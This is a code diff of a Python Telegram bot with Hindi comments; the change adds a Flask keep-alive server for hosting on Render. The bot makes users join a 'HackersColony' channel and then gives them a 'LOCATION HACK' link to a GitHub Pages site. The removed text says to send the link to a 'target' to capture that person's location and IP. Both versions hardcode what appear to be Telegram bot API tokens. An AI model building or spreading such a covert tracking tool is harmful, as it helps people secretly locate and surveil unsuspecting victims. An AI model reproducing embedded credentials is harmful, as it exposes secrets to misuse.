@@ -1,76 +1,66 @@
 import telebot
 from telebot import types
+from flask import Flask
+import threading
+import os
 
-# --- सेटअप (यहाँ अपनी जानकारी भरें) ---
-API_TOKEN = '8341294834:AAGDMuDZJ8ZYtC6QPnF_3KH_aRJ3wXyg_w0'# अपना असली टोकन यहाँ पेस्ट करें
+# --- Flask सेटअप (Render के Port Error को ठीक करने के लिए) ---
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "Bot is Running!"
+
+def run():
+    # Render द्वारा दिए गए पोर्ट पर सर्वर चलाना
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
+
+# --- टेलीग्राम बॉट सेटअप ---
+API_TOKEN = '7607380112:AAFqTInE7pX0N_3A76uF85nS_m0_8_jH8uM' # आपका टोकन
 bot = telebot.TeleBot(API_TOKEN)
 
-# चैनल का यूजरनेम (बिना @ के)
 CHANNEL_ID = 'HackersColony' 
-# आपकी GitHub वाली लोकेशन ट्रैकिंग लिंक
 WEBSITE_URL = "https://roshan0786shah.github.io/Security-check-/"
 
-# --- फंक्शन: चैनल जॉइन चेक करने के लिए ---
 def check_sub(user_id):
     try:
         status = bot.get_chat_member(f"@{CHANNEL_ID}", user_id).status
         return status in ['member', 'administrator', 'creator']
-    except Exception as e:
-        print(f"Error checking sub: {e}")
+    except:
         return False
 
-# --- कमांड: /start ---
 @bot.message_handler(commands=['start'])
 def start(message):
-    user_id = message.from_user.id
-    user_name = message.from_user.first_name
-    
-    if check_sub(user_id):
-        # अगर यूजर ने जॉइन किया है
+    if check_sub(message.from_user.id):
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-        btn1 = types.KeyboardButton("🚀 LOCATION HACK")
-        btn2 = types.KeyboardButton("🤖 CONTACT ADMIN")
-        btn3 = types.KeyboardButton("📢 BROADCAST")
-        markup.add(btn1, btn2)
-        markup.add(btn3)
-        
-        bot.send_message(message.chat.id, f"✅ Welcome back {user_name}!\nSelect your tool from the keyboard below:", reply_markup=markup)
+        markup.add(types.KeyboardButton("🚀 LOCATION HACK"), types.KeyboardButton("🤖 CONTACT ADMIN"))
+        bot.send_message(message.chat.id, f"✅ Welcome {message.from_user.first_name}!", reply_markup=markup)
     else:
-        # अगर जॉइन नहीं किया है
         markup = types.InlineKeyboardMarkup()
-        join_btn = types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_ID}")
-        check_btn = types.InlineKeyboardButton("🔄 I joined", callback_data="check")
-        markup.add(join_btn)
-        markup.add(check_btn)
-        
-        bot.send_message(message.chat.id, "❌ Access Denied!\nYou must join our channel to use this bot.", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_ID}"))
+        markup.add(types.InlineKeyboardButton("🔄 I joined", callback_data="check"))
+        bot.send_message(message.chat.id, "❌ Please join our channel first!", reply_markup=markup)
 
-# --- बटन क्लिक चेक करने के लिए ---
 @bot.callback_query_handler(func=lambda call: call.data == "check")
 def check_callback(call):
     if check_sub(call.from_user.id):
-        bot.answer_callback_query(call.id, "✅ Thank you for joining!")
+        bot.answer_callback_query(call.id, "✅ Success!")
         start(call.message)
     else:
-        bot.answer_callback_query(call.id, "❌ You haven't joined @HackersColony yet!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)
 
-# --- बटन: LOCATION HACK ---
 @bot.message_handler(func=lambda message: message.text == "🚀 LOCATION HACK")
 def loc_hack(message):
-    msg = (
-        "⚒ Tool Generated Successfully!\n\n"
-        "Copy and send this link to your target. You will get their Location & IP once they open it.\n\n"
-        f"🔗 Your Link: {WEBSITE_URL}"
-    )
-    bot.send_message(message.chat.id, msg)
+    bot.send_message(message.chat.id, f"🔗 Your Link: {WEBSITE_URL}")
 
-# --- बॉट को चालू रखना (Render के लिए) ---
+# --- मुख्य हिस्सा (Main Execution) ---
 if __name__ == "__main__":
+    # Flask को अलग थ्रेड में चलाएं ताकि Render खुश रहे
+    t = threading.Thread(target=run)
+    t.daemon = True
+    t.start()
+    
     print("Bot is starting...")
-    try:
-        # Render के लिए टाइमआउट सेटिंग के साथ बॉट शुरू करें
-        bot.infinity_polling(timeout=20, long_polling_timeout=10)
-    except Exception as e:
-        print(f"Error occurred: {e}")
-        
-      
+    bot.infinity_polling(timeout=20, long_polling_timeout=10)
+    
